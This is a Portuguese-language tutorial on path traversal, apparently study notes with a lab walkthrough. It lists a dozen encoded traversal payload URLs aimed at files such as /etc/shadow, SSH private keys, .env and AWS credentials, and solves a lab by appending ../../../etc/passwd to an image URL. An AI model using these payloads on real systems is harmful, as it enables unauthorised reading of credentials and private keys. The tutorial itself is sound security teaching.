
# Path Traversal

**Path Traversal (ou Directory Traversal)** é uma vulnerabilidade que ocorre quando a aplicação concatena a entrada do usuário em um caminho de arquivo sem validar nem normalizar o resultado. Com sequências como `../` (ou equivalentes codificados, como `%2e%2e%2f` e `..%252f`), o atacante sai do diretório base pretendido e lê, ou em alguns casos escreve, arquivos arbitrários no sistema, como `/etc/passwd`, chaves e arquivos de configuração, indo de vazamento de dados sensíveis a execuções remotas, quando é possível, por exemplo, sobrescrever arquivos executáveis ou de configuração.

Mais alguns exemplos:

```
https://example.com/download?file=../../../../etc/shadow
https://example.com/image?filename=..%2f..%2f..%2f.ssh%2fid_rsa
https://example.com/view?page=..%2f..%2f..%2fvar%2fwww%2fhtml%2fconfig.php
https://example.com/download?file=....//....//....//proc/self/environ
https://example.com/file?path=../../../../home/user/.bash_history
https://example.com/view?page=..\..\..\..\inetpub\wwwroot\web.config
https://example.com/download?file=..%252f..%252f..%252fvar%252flog%252fapache2%252faccess.log
https://example.com/image?filename=..%2f..%2f..%2fapp%2f.env
https://example.com/view?page=..%5c..%5c..%5cxampp%5cmysql%5cdata%5cmysql%5cuser.frm
https://example.com/file?path=../../../../etc/nginx/nginx.conf
https://example.com/download?file=..%c0%af..%c0%af..%c0%afroot%c0%af.aws%c0%afcredentials
https://example.com/view?page=....\/....\/....\/var/lib/docker/containers/config.json
```

📚 Referências e/ou leituras recomendadas:
- [OWASP Top 10 2021 – A01: Quebra de Controle de Acesso (pt-BR)](https://owasp.org/Top10/2021/pt-BR/A01_2021-Broken_Access_Control/)
- [OWASP Community – Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [MITRE CWE-22 – Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
- [PortSwigger Web Security Academy – File Path Traversal](https://portswigger.net/web-security/file-path-traversal)

---

## Lab 1: Exemplo simples de File Path Traversal

> **Objetivo:** baixar o arquivo `/etc/passwd` do servidor.¹

A primeira coisa que fazemos é, como de costume, dar uma olhada no código-fonte. O site a que tivemos acesso nesse lab é repleto de imagens, e cada uma delas está armazenada em algum diretório, isto é, _elas vêm de algum lugar_.

Mas o lugar (ou seja, o diretório) que precisamos acessar está precisamente na raiz, em `/etc/passwd`. Para tanto, basta acessar uma das imagens em uma nova aba e adicionar `../../../etc/passwd` ao final da URL, para que isso nos traga o arquivo que precisamos baixar.

---

¹ O `/etc/passwd` é um arquivo de texto em sistemas Unix/Linux que armazena informações das contas de usuário, como nome, UID, GID, diretório home e shell padrão. Embora não contenha mais os hashes de senhas (migrados para `/etc/shadow`), é de alguma utilidade em possíveis enumerações.
